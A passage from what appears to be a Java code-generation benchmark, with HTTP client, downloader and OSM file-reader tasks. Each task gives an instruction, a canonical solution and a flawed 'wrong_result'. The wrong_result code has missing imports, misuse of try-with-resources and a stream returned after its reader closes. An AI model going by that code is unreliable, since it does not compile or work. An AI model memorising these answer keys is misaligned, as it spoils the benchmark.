    "Canonical_solution": "import android.os.AsyncTask;\nimport org.json.JSONArray;\nimport org.json.JSONObject;\nimport java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                String NewsData;\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    NewsData = ConvertInputToStringNoChange(in);\n                    publishProgress(NewsData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {}\n            return null;\n        }\n\n        protected void onProgressUpdate(String... progress) {\n            try {\n                JSONArray json = new JSONArray(progress[0]);\n                for (int i = 0; i < json.length(); i++) {\n                    JSONObject user = json.getJSONObject(i);\n                    // Handle the parsed JSON data here\n                }\n            } catch (Exception ex) {}\n        }\n\n        protected void onPostExecute(String result2) {\n            // Handle post-execution tasks here\n        }\n    }\n\n    public static String ConvertInputToStringNoChange(InputStream inputStream) {\n        BufferedReader bureader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        String linereultcal = \"\";\n\n        try {\n            while ((line = bureader.readLine()) != null) {\n                linereultcal += line;\n            }\n            inputStream.close();\n        } catch (Exception ex) {}\n\n        return linereultcal;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpRequestHandler {\n    public String getNews(String... params) {\n        MyAsyncTask task = new MyAsyncTask();\n        String result = task.execute(params).get();\n        return result;\n    }\n\n    private static class MyAsyncTask extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            String url = params[0];\n            try {\n                URL urlObj = new URL(url);\n                HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();\n                conn.setRequestMethod(\"GET\");\n                conn.connect();\n                int responseCode = conn.getResponseCode();\n                if (responseCode == HttpURLConnection.HTTP_OK) {\n                    InputStream inputStream = conn.getInputStream();\n                    return ConvertInputToStringNoChange(inputStream);\n                } else {\n                    return \"Error: \" + responseCode;\n                }\n            } catch (IOException e) {\n                return \"Error: \" + e.getMessage();\n            }\n        }\n\n        @Override\n        protected void onProgressUpdate(String... progress) {\n            try {\n                JSONArray jsonArray = new JSONArray(progress[0]);\n                for (int i = 0; i < jsonArray.length(); i++) {\n                    JSONObject jsonObject = jsonArray.getJSONObject(i);\n                    // Process individual JSON objects\n                }\n            } catch (JSONException e) {\n                e.printStackTrace();\n            }\n        }\n\n        @Override\n        protected void onPostExecute(String result) {\n            // Handle post-execution tasks\n        }\n    }\n\n    private String ConvertInputToStringNoChange(InputStream inputStream) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            sb.append(line);\n        }\n        return sb.toString();\n    }\n}"
  },
  {
    "Task_id": 107,
    "Instruction": "Task Description: Implement a Java class that handles HTTP downloads with support for redirects and user-agent customization.\n\nClass Description: The HttpDownloader class provides functionality to download files from HTTP URLs while handling redirects (up to a maximum limit) and allowing customization of the User-Agent header. It includes logging capabilities for tracking download progress and errors.\n\nAttributes:\n- logger: Logger - SLF4J logger for tracking download operations and errors\n- MAXIMUM_REDIRECTS: int - Maximum number of redirects to follow (constant value 8)\n\nMethods:\n- download(String targetUrlString, Path path, String userAgent) -> void - Main method to initiate download from a URL to a specified path with a custom user agent. Throws IOException for network or file operation failures.\n- getDownloadedOrNextUrl(String urlString, Path path, String userAgent) -> Optional<String> - Helper method that processes a single URL request, either downloading the content or returning the next URL in case of redirect. Throws IOException for network or file operation failures. Returns Optional.empty() if download was successful, or Optional containing the next URL if redirect occurred.",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardCopyOption;\nimport java.util.Optional;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nclass HttpDownloader {\n    private static final Logger logger = LoggerFactory.getLogger(HttpDownloader.class);\n    private static final int MAXIMUM_REDIRECTS = 8;\n\n    public static void download(final String targetUrlString, final Path path, final String userAgent) throws IOException {\n        logger.info(\"Started download from: \" + targetUrlString);\n\n        String urlString = targetUrlString;\n        for (int i = 0; i < MAXIMUM_REDIRECTS; ++i) {\n            final Optional<String> nextUrlString = getDownloadedOrNextUrl(urlString, path, userAgent);\n            if (!nextUrlString.isPresent()) {\n                return;\n            }\n            logger.info(\"Redirected to: \" + nextUrlString.get());\n            urlString = nextUrlString.get();\n        }\n        throw new IOException(\"Too many redirects from: \" + targetUrlString);\n    }\n\n    private static Optional<String> getDownloadedOrNextUrl(final String urlString, final Path path, final String userAgent)\n            throws IOException {\n        logger.debug(\"Requesting GET {}\", urlString);\n        final URL url;\n        try {\n            url = new URL(urlString);\n        } catch (final MalformedURLException ex) {\n            throw new IOException(\"Invalid URL: \" + urlString, ex);\n        }\n\n        final HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        try {\n            connection.setInstanceFollowRedirects(false);\n            connection.setRequestMethod(\"GET\");\n            connection.setRequestProperty(\"Accept\", \"*/*\");\n            connection.setRequestProperty(\"User-Agent\", userAgent);\n            connection.connect();\n\n            final int statusCode = connection.getResponseCode();\n            logger.debug(\"Received HTTP status code {} from GET {}\", statusCode, urlString);\n            switch (statusCode) {\n                case HttpURLConnection.HTTP_MOVED_PERM:\n                case HttpURLConnection.HTTP_MOVED_TEMP:\n                    final String location = connection.getHeaderField(\"Location\");\n                    if (location == null) {\n                        throw new IOException(\"No Location header for HTTP status code \" + statusCode);\n                    }\n                    return Optional.of(location);\n                case HttpURLConnection.HTTP_OK:\n                    final InputStream downloadStream = connection.getInputStream();\n                    logger.info(\"Downloading from {} into {}\", urlString, path.toString());\n                    Files.copy(downloadStream, path, StandardCopyOption.REPLACE_EXISTING);\n                    logger.info(\"Downloaded\");\n                    return Optional.empty();\n                default:\n                    final String responseMessage;\n                    try {\n                        responseMessage = connection.getResponseMessage();\n                    } catch (final IOException ex) {\n                        throw new IOException(\"Unexpected HTTP status code \" + statusCode, ex);\n                    }\n                    throw new IOException(\"Unexpected HTTP status code \" + statusCode + \" with message: \" + responseMessage);\n            }\n        } finally {\n            connection.disconnect();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport java.io.*;\nimport java.net.*;\nimport java.nio.file.Path;\n\npublic class HttpDownloader {\n    private static final int MAXIMUM_REDIRECTS = 8;\n    private final Logger logger = LoggerFactory.getLogger(HttpDownloader.class);\n\n    public void download(String targetUrlString, Path path, String userAgent) throws IOException {\n        String currentUrl = targetUrlString;\n        int redirectCount = 0;\n        while (true) {\n            Optional<String> nextUrl = getDownloadedOrNextUrl(currentUrl, path, userAgent);\n            if (nextUrl.isEmpty()) {\n                break;\n            } else {\n                currentUrl = nextUrl.get();\n                redirectCount++;\n                if (redirectCount >= MAXIMUM_REDIRECTS) {\n                    throw new IOException(\"Maximum redirects (\" + MAXIMUM_REDIRECTS + \") exceeded for URL: \" + currentUrl);\n                }\n            }\n        }\n    }\n\n    private Optional<String> getDownloadedOrNextUrl(String urlString, Path path, String userAgent) throws IOException {\n        logger.info(\"Starting download for URL: {}\", urlString);\n        try (HttpURLConnection connection = (HttpURLConnection) new URL(urlString).openConnection()) {\n            connection.setRequestProperty(\"User-Agent\", userAgent);\n            int responseCode = connection.getResponseCode();\n\n            if (responseCode >= 300 && responseCode < 400) {\n                String location = connection.getHeaderField(\"Location\");\n                if (location == null || location.isEmpty()) {\n                    throw new IOException(\"Redirect response without Location header\");\n                }\n                logger.info(\"Redirect detected. Moving to: {}\", location);\n                return Optional.of(location);\n            } else if (responseCode >= 400) {\n                throw new IOException(\"HTTP error code: \" + responseCode);\n            }\n\n            try (InputStream inputStream = connection.getInputStream()) {\n                try (OutputStream outputStream = Files.newOutputStream(path)) {\n                    byte[] buffer = new byte[4096];\n                    int bytesRead;\n                    while ((bytesRead = inputStream.read(buffer)) != -1) {\n                        outputStream.write(buffer, 0, bytesRead);\n                    }\n                    logger.info(\"Download completed for URL: {}\", urlString);\n                }\n            }\n            return Optional.empty();\n        } catch (IOException e) {\n            logger.error(\"Error during download for URL: {}\", urlString, e);\n            throw e;\n        }\n    }\n}"
  },
  {
    "Task_id": 108,
    "Instruction": "Task Description: Create a utility class for handling various HTTP operations including GET, POST requests, file downloads, and form submissions.\n\nClass Description: WebUtils is a utility class that provides static methods for performing common HTTP operations. It handles connection management, request configuration, and response processing.\n\nMethods:\n\nMethod1: getBody(String reqURL) -> String - Performs a GET request to the specified URL and returns the response body as a string.\nMethod2: getJson(String reqURL) -> JsonNode - Performs a GET request to the specified URL and parses the JSON response into a JsonNode object.\nMethod3: downloadFile(String reqURL, String fileLocation) -> void - Downloads a file from the specified URL and saves it to the given file location.\nMethod4: post(String reqURL, String postContent) -> String - Performs a POST request with plain text content to the specified URL and returns the response body.\nMethod5: postForm(String reqURL, Map<String, String> fields) -> String - Performs a form submission (application/x-www-form-urlencoded) to the specified URL with the given form fields and returns the response body.\nMethod6: getLineStream(String reqURL) -> Stream<String> - Performs a GET request to the specified URL and returns the response as a stream of lines.\nMethod7: getUserAgent() -> String - Returns a formatted User-Agent string for HTTP requests.\nMethod8: connectionToString(HttpURLConnection con) -> String - Helper method that reads the response from an HttpURLConnection and converts it to a string.",
    "Canonical_solution": "import com.fasterxml.jackson.databind.JsonNode;\nimport org.geysermc.geyser.GeyserImpl;\n\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\nimport java.util.Map;\nimport java.util.stream.Stream;\n\npublic class WebUtils {\n\n    public static String getBody(String reqURL) {\n        try {\n            URL url = new URL(reqURL);\n            HttpURLConnection con = (HttpURLConnection) url.openConnection();\n            con.setRequestMethod(\"GET\");\n            con.setRequestProperty(\"User-Agent\", getUserAgent());\n            con.setConnectTimeout(10000);\n            con.setReadTimeout(10000);\n\n            return connectionToString(con);\n        } catch (Exception e) {\n            return e.getMessage();\n        }\n    }\n\n    public static JsonNode getJson(String reqURL) throws IOException {\n        HttpURLConnection con = (HttpURLConnection) new URL(reqURL).openConnection();\n        con.setRequestProperty(\"User-Agent\", getUserAgent());\n        con.setConnectTimeout(10000);\n        con.setReadTimeout(10000);\n        return GeyserImpl.JSON_MAPPER.readTree(con.getInputStream());\n    }\n\n    public static void downloadFile(String reqURL, String fileLocation) {\n        try {\n            HttpURLConnection con = (HttpURLConnection) new URL(reqURL).openConnection();\n            con.setRequestProperty(\"User-Agent\", getUserAgent());\n            InputStream in = con.getInputStream();\n            Files.copy(in, Paths.get(fileLocation), StandardCopyOption.REPLACE_EXISTING);\n        } catch (Exception e) {\n            throw new RuntimeException(\"Unable to download and save file: \" + fileLocation + \" (\" + reqURL + \")\", e);\n        }\n    }\n\n    public static String post(String reqURL, String postContent) throws IOException {\n        URL url = new URL(reqURL);\n        HttpURLConnection con = (HttpURLConnection) url.openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setRequestProperty(\"Content-Type\", \"text/plain\");\n        con.setRequestProperty(\"User-Agent\", getUserAgent());\n        con.setDoOutput(true);\n\n        OutputStream out = con.getOutputStream();\n        out.write(postContent.getBytes(StandardCharsets.UTF_8));\n        out.close();\n\n        return connectionToString(con);\n    }\n\n    private static String connectionToString(HttpURLConnection con) throws IOException {\n        con.getResponseCode();\n\n        InputStream inputStream = con.getErrorStream();\n        if (inputStream == null) {\n            inputStream = con.getInputStream();\n        }\n\n        StringBuilder content = new StringBuilder();\n        try (BufferedReader in = new BufferedReader(new InputStreamReader(inputStream))) {\n            String inputLine;\n\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n                content.append(\"\\n\");\n            }\n\n            con.disconnect();\n        }\n\n        return content.toString();\n    }\n\n    public static String postForm(String reqURL, Map<String, String> fields) throws IOException {\n        URL url = new URL(reqURL);\n        HttpURLConnection con = (HttpURLConnection) url.openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        con.setRequestProperty(\"User-Agent\", getUserAgent());\n        con.setDoOutput(true);\n\n        try (OutputStream out = con.getOutputStream()) {\n            for (Map.Entry<String, String> field : fields.entrySet()) {\n                out.write((field.getKey() + \"=\" + URLEncoder.encode(field.getValue(), StandardCharsets.UTF_8) + \"&\").getBytes(StandardCharsets.UTF_8));\n            }\n        }\n\n        return connectionToString(con);\n    }\n\n    public static Stream<String> getLineStream(String reqURL) {\n        try {\n            URL url = new URL(reqURL);\n            HttpURLConnection con = (HttpURLConnection) url.openConnection();\n            con.setRequestMethod(\"GET\");\n            con.setRequestProperty(\"User-Agent\", getUserAgent());\n            con.setConnectTimeout(10000);\n            con.setReadTimeout(10000);\n\n            return connectionToString(con).lines();\n        } catch (Exception e) {\n            GeyserImpl.getInstance().getLogger().error(\"Error while trying to get a stream from \" + reqURL, e);\n            return Stream.empty();\n        }\n    }\n\n    public static String getUserAgent() {\n        return \"Geyser-\" + GeyserImpl.getInstance().getPlatformType().platformName() + \"/\" + GeyserImpl.VERSION;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.stream.Stream;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class WebUtils {\n    public static String getUserAgent() {\n        return \"Java HttpClient/1.0\";\n    }\n\n    private static String connectionToString(HttpURLConnection con) throws IOException {\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(con.getInputStream()))) {\n            StringBuilder sb = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line);\n            }\n            return sb.toString();\n        }\n    }\n\n    public static String getBody(String reqURL) throws IOException {\n        URL url = new URL(reqURL);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"GET\");\n        conn.setRequestProperty(\"User-Agent\", getUserAgent());\n        return connectionToString(conn);\n    }\n\n    public static JsonNode getJson(String reqURL) throws IOException {\n        String responseBody = getBody(reqURL);\n        ObjectMapper mapper = new ObjectMapper();\n        return mapper.readTree(responseBody);\n    }\n\n    public static void downloadFile(String reqURL, String fileLocation) throws IOException {\n        URL url = new URL(reqURL);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"GET\");\n        conn.setRequestProperty(\"User-Agent\", getUserAgent());\n        try (InputStream inputStream = conn.getInputStream();\n             FileOutputStream fos = new FileOutputStream(fileLocation)) {\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n        }\n    }\n\n    public static String post(String reqURL, String postContent) throws IOException {\n        URL url = new URL(reqURL);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"POST\");\n        conn.setRequestProperty(\"User-Agent\", getUserAgent());\n        conn.setRequestProperty(\"Content-Type\", \"text/plain\");\n        conn.setDoOutput(true);\n        try (OutputStream os = conn.getOutputStream()) {\n            os.write(postContent.getBytes());\n        }\n        return connectionToString(conn);\n    }\n\n    public static String postForm(String reqURL, Map<String, String> fields) throws IOException {\n        URL url = new URL(reqURL);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"POST\");\n        conn.setRequestProperty(\"User-Agent\", getUserAgent());\n        conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        conn.setDoOutput(true);\n        try (OutputStream os = conn.getOutputStream()) {\n            StringBuilder formData = new StringBuilder();\n            for (Map.Entry<String, String> entry : fields.entrySet()) {\n                if (formData.length() > 0) formData.append(\"&\");\n                formData.append(encodeUrlParameter(entry.getKey())).append(\"=\").append(encodeUrlParameter(entry.getValue()));\n            }\n            os.write(formData.toString().getBytes());\n        }\n        return connectionToString(conn);\n    }\n\n    private static String encodeUrlParameter(String value) {\n        try {\n            return URLEncoder.encode(value, \"UTF-8\");\n        } catch (UnsupportedEncodingException e) {\n            throw new RuntimeException(\"Encoding failed\", e);\n        }\n    }\n\n    public static Stream<String> getLineStream(String reqURL) throws IOException {\n        URL url = new URL(reqURL);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"GET\");\n        conn.setRequestProperty(\"User-Agent\", getUserAgent());\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n            return reader.lines();\n        }\n    }\n}"
  },
  {
    "Task_id": 109,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests using HttpURLConnection, supporting both GET and POST methods with configurable timeouts and headers.\n\nClass Description: The RealRequest class provides functionality to make HTTP GET and POST requests with configurable connection settings. It handles request creation, header management, response processing, and error handling.\n\nAttributes:\n- sRequestURL: String - Static field storing the last requested URL\n- httpConfig: HttpConfig - Configuration object for connection settings (timeouts, etc.)\n- TAG: String - Constant for logging purposes (value: \"SA.HttpRequest\")\n\nMethods:\n- getData(String requestURL, Map<String, String> headerMap) -> RealResponse - Performs a GET request to the specified URL with optional headers\n- postData(String requestURL, String body, String bodyType, Map<String, String> headerMap) -> RealResponse - Performs a POST request with request body, content type, and optional headers\n- getHttpURLConnection(String requestURL, String requestMethod) -> HttpURLConnection - Creates and configures an HttpURLConnection instance\n- setHeader(HttpURLConnection conn, Map<String, String> headerMap) -> void - Applies headers to the connection\n- getRealResponse(HttpURLConnection conn) -> RealResponse - Processes the HTTP response into a standardized format\n- getExceptionResponse(Exception e) -> RealResponse - Creates an error response from an exception\n- setHttpConfig(HttpConfig httpConfig) -> RealRequest - Sets the HTTP configuration (builder pattern)",
    "Canonical_solution": "import android.text.TextUtils;\nimport com.sensorsdata.analytics.android.sdk.SAConfigOptions;\nimport com.sensorsdata.analytics.android.sdk.SALog;\nimport com.sensorsdata.analytics.android.sdk.SensorsDataAPI;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport javax.net.ssl.HttpsURLConnection;\nimport static com.sensorsdata.analytics.android.sdk.util.Base64Coder.CHARSET_UTF8;\n\nclass RealRequest {\n    private static final String TAG = \"SA.HttpRequest\";\n    private static String sRequestURL;\n    private HttpConfig httpConfig = new HttpConfig();\n\n    RealResponse getData(String requestURL, Map<String, String> headerMap) {\n        try {\n            SALog.i(TAG, String.format(\"url:%s,\\nmethod:GET\", requestURL));\n            sRequestURL = requestURL;\n            HttpURLConnection conn = getHttpURLConnection(requestURL, \"GET\");\n            if (headerMap != null) {\n                setHeader(conn, headerMap);\n            }\n            conn.connect();\n            return getRealResponse(conn);\n        } catch (Exception e) {\n            return getExceptionResponse(e);\n        }\n    }\n\n    RealResponse postData(String requestURL, String body, String bodyType, Map<String, String> headerMap) {\n        BufferedWriter writer = null;\n        try {\n            HttpURLConnection conn;\n            sRequestURL = requestURL;\n            SALog.i(TAG, String.format(\"url:%s\\nparams:%s\\nmethod:POST\", requestURL, body));\n            conn = getHttpURLConnection(requestURL, \"POST\");\n            conn.setDoOutput(true);\n            conn.setUseCaches(false);\n            if (!TextUtils.isEmpty(bodyType)) {\n                conn.setRequestProperty(\"Content-Type\", bodyType);\n            }\n            if (headerMap != null) {\n                setHeader(conn, headerMap);\n            }\n            conn.connect();\n            if (!TextUtils.isEmpty(body)) {\n                writer = new BufferedWriter(new OutputStreamWriter(conn.getOutputStream(), CHARSET_UTF8));\n                writer.write(body);\n                writer.flush();\n            }\n            return getRealResponse(conn);\n        } catch (Exception e) {\n            return getExceptionResponse(e);\n        } finally {\n            if (writer != null) {\n                try {\n                    writer.close();\n                } catch (IOException e) {\n                    SALog.printStackTrace(e);\n                }\n            }\n        }\n    }\n\n    private HttpURLConnection getHttpURLConnection(String requestURL, String requestMethod) throws IOException {\n        URL url = new URL(requestURL);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(requestMethod);\n        conn.setUseCaches(false);\n        conn.setConnectTimeout(httpConfig.getConnectionTimeout());\n        conn.setReadTimeout(httpConfig.getReadTimeout());\n        if (requestMethod.equals(\"POST\")) {\n            conn.setDoOutput(true);\n        }\n        SAConfigOptions configOptions = SensorsDataAPI.getConfigOptions();\n        if (configOptions != null && configOptions.getSSLSocketFactory() != null\n                && conn instanceof HttpsURLConnection) {\n            ((HttpsURLConnection) conn).setSSLSocketFactory(configOptions.getSSLSocketFactory());\n        }\n        return conn;\n    }\n\n    private void setHeader(HttpURLConnection conn, Map<String, String> headerMap) {\n        if (headerMap != null) {\n            for (String key : headerMap.keySet()) {\n                conn.setRequestProperty(key, headerMap.get(key));\n            }\n        }\n    }\n\n    private RealResponse getRealResponse(HttpURLConnection conn) {\n        RealResponse response = new RealResponse();\n        try {\n            response.code = conn.getResponseCode();\n            if (HttpUtils.needRedirects(response.code)) {\n                response.location = HttpUtils.getLocation(conn, sRequestURL);\n            }\n            response.contentLength = conn.getContentLength();\n            if (response.code < HttpURLConnection.HTTP_BAD_REQUEST) {\n                response.result = HttpUtils.getRetString(conn.getInputStream());\n            } else {\n                response.errorMsg = HttpUtils.getRetString(conn.getErrorStream());\n            }\n        } catch (IOException e) {\n            return getExceptionResponse(e);\n        } finally {\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n        SALog.i(TAG, response.toString());\n        return response;\n    }\n\n    private RealResponse getExceptionResponse(Exception e) {\n        RealResponse response = new RealResponse();\n        response.exception = e;\n        response.errorMsg = e.getMessage();\n        SALog.i(TAG, response.toString());\n        return response;\n    }\n\n    public RealRequest setHttpConfig(HttpConfig httpConfig) {\n        if(httpConfig == null) {\n            return this;\n        }\n        this.httpConfig = httpConfig;\n        return this;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpConfig {\n    private int connectionTimeout;\n    private int readTimeout;\n\n    public HttpConfig(int connectionTimeout, int readTimeout) {\n        this.connectionTimeout = connectionTimeout;\n        this.readTimeout = readTimeout;\n    }\n\n    public int getConnectionTimeout() {\n        return connectionTimeout;\n    }\n\n    public int getReadTimeout() {\n        return readTimeout;\n    }\n}\n\npublic class RealResponse {\n    private int statusCode;\n    private String statusMessage;\n    private String responseBody;\n\n    public RealResponse(int statusCode, String statusMessage, String responseBody) {\n        this.statusCode = statusCode;\n        this.statusMessage = statusMessage;\n        this.responseBody = responseBody;\n    }\n\n    public int getStatusCode() {\n        return statusCode;\n    }\n\n    public String getStatusMessage() {\n        return statusMessage;\n    }\n\n    public String getResponseBody() {\n        return responseBody;\n    }\n}\n\npublic class RealRequest {\n    public static String sRequestURL;\n    private HttpConfig httpConfig;\n    public static final String TAG = \"SA.HttpRequest\";\n\n    public RealRequest setHttpConfig(HttpConfig httpConfig) {\n        this.httpConfig = httpConfig;\n        return this;\n    }\n\n    public RealResponse getData(String requestURL, Map<String, String> headerMap) {\n        try {\n            HttpURLConnection conn = getHttpURLConnection(requestURL, \"GET\");\n            setHeader(conn, headerMap);\n            return getRealResponse(conn);\n        } catch (Exception e) {\n            return getExceptionResponse(e);\n        }\n    }\n\n    public RealResponse postData(String requestURL, String body, String bodyType, Map<String, String> headerMap) {\n        try {\n            HttpURLConnection conn = getHttpURLConnection(requestURL, \"POST\");\n            setHeader(conn, headerMap);\n            conn.setDoOutput(true);\n            try (OutputStream os = conn.getOutputStream()) {\n                byte[] input = body.getBytes(bodyType);\n                os.write(input);\n            }\n            return getRealResponse(conn);\n        } catch (Exception e) {\n            return getExceptionResponse(e);\n        }\n    }\n\n    private HttpURLConnection getHttpURLConnection(String requestURL, String requestMethod) throws IOException {\n        HttpURLConnection conn = (HttpURLConnection) new URL(requestURL).openConnection();\n        conn.setRequestMethod(requestMethod);\n        if (httpConfig != null) {\n            conn.setConnectTimeout(httpConfig.getConnectionTimeout());\n            conn.setReadTimeout(httpConfig.getReadTimeout());\n        }\n        return conn;\n    }\n\n    private void setHeader(HttpURLConnection conn, Map<String, String> headerMap) {\n        if (headerMap != null) {\n            for (Map.Entry<String, String> entry : headerMap.entrySet()) {\n                conn.setRequestProperty(entry.getKey(), entry.getValue());\n            }\n        }\n    }\n\n    private RealResponse getRealResponse(HttpURLConnection conn) throws IOException {\n        int code = conn.getResponseCode();\n        String message = conn.getResponseMessage();\n        StringBuilder responseBody = new StringBuilder();\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                responseBody.append(line);\n            }\n        }\n        return new RealResponse(code, message, responseBody.toString());\n    }\n\n    private RealResponse getExceptionResponse(Exception e) {\n        return new RealResponse(-1, \"Error\", e.getMessage());\n    }\n}"
  },
  {
    "Task_id": 11,
    "Instruction": "Task Description: Create a Java class that reads and processes OSM (OpenStreetMap) PBF (Protocolbuffer Binary Format) files using Java NIO's FileChannel for efficient file operations, with support for lazy reading of file blocks.\n\nClass Description: The OsmInputFile class provides functionality to read and process OSM PBF files. It supports both eager and lazy reading modes, where lazy reading defers the actual decoding of data blocks until needed. The class uses FileChannel for efficient file operations and includes methods for reading headers, blocks, and validating file contents.\n\nAttributes:\n- path: [Path] - The file path to the OSM PBF file to be processed\n- lazy: [boolean] - Flag indicating whether to use lazy reading mode for file blocks\n\nMethods:\n- readInt: [readInt]([FileChannel channel]) -> [int] - Reads a 4-byte integer from the specified FileChannel\n- readBytes: [readBytes]([FileChannel channel, int length]) -> [byte[]] - Reads a specified number of bytes from the current position in the FileChannel\n- readBytes: [readBytes]([FileChannel channel, long offset, int length]) -> [byte[]] - Reads a specified number of bytes from a specific offset in the FileChannel\n- readBlobHeader: [readBlobHeader]([FileChannel channel]) -> [BlobHeader] - Reads and parses a BlobHeader from the FileChannel\n- openChannel: [openChannel]() -> [FileChannel] - Opens and returns a FileChannel for reading the input file\n- LazyReader (inner class): [LazyReader]() -> [OsmBlockSource] - Implements lazy reading functionality for OSM blocks\n  - forEachBlock: [forEachBlock]([Consumer<Block> consumer]) -> [void] - Processes each block in the file using the provided consumer\n  - close: [close]() -> [void] - Closes the lazy reading channel\n  - LazyBlock (inner record): [LazyBlock]([long offset, int length, FileChannel channel]) -> [Block] - Represents a lazily-read block\n    - decodeElements: [decodeElements]() -> [Iterable<OsmElement>] - Decodes the block's elements when accessed",
    "Canonical_solution": "import com.onthegomap.planetiler.reader.FileFormatException;\nimport com.onthegomap.planetiler.util.ByteBufferUtil;\nimport crosby.binary.Fileformat.BlobHeader;\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.List;\nimport java.util.function.Consumer;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class OsmInputFile {\n\n  private static final Logger LOGGER = LoggerFactory.getLogger(OsmInputFile.class);\n\n  private final Path path;\n  private final boolean lazy;\n\n  public OsmInputFile(Path path, boolean lazyReads) {\n    this.path = path;\n    lazy = lazyReads;\n  }\n\n  private static int readInt(FileChannel channel) throws IOException {\n    ByteBuffer buf = ByteBuffer.allocate(4);\n    int read = channel.read(buf);\n    if (read != 4) {\n      throw new IOException(\"Tried to read 4 bytes but only got \" + read);\n    }\n    return buf.flip().getInt();\n  }\n\n  private static byte[] readBytes(FileChannel channel, int length) throws IOException {\n    ByteBuffer buf = ByteBuffer.allocate(length);\n    int read = channel.read(buf);\n    if (read != length) {\n      throw new IOException(\"Tried to read \" + length + \" bytes but only got \" + read);\n    }\n    return buf.flip().array();\n  }\n\n  private static byte[] readBytes(FileChannel channel, long offset, int length) throws IOException {\n    ByteBuffer buf = ByteBuffer.allocate(length);\n    int read = channel.read(buf, offset);\n    if (read != length) {\n      throw new IOException(\"Tried to read \" + length + \" bytes at \" + offset + \" but only got \" + read);\n    }\n    return buf.flip().array();\n  }\n\n  private static BlobHeader readBlobHeader(FileChannel channel) throws IOException {\n    int headerSize = readInt(channel);\n    if (headerSize > 64 * 1024) {\n      throw new IllegalArgumentException(\"Header longer than 64 KiB\");\n    }\n    byte[] headerBytes = readBytes(channel, headerSize);\n    return BlobHeader.parseFrom(headerBytes);\n  }\n\n  private FileChannel openChannel() {\n    try {\n      return FileChannel.open(path, StandardOpenOption.READ);\n    } catch (IOException e) {\n      throw new UncheckedIOException(e);\n    }\n  }\n\n  private class LazyReader implements OsmBlockSource {\n\n    final FileChannel lazyReadChannel = openChannel();\n\n    @Override\n    public void forEachBlock(Consumer<Block> consumer) {\n      try (FileChannel channel = openChannel()) {\n        final long size = channel.size();\n        while (channel.position() < size) {\n          BlobHeader header = readBlobHeader(channel);\n          int blockSize = header.getDatasize();\n          String headerType = header.getType();\n          long blockStartPosition = channel.position();\n          if (\"OSMData\".equals(headerType)) {\n            consumer.accept(new LazyBlock(blockStartPosition, blockSize, lazyReadChannel));\n          } else if (\"OSMHeader\".equals(headerType)) {\n            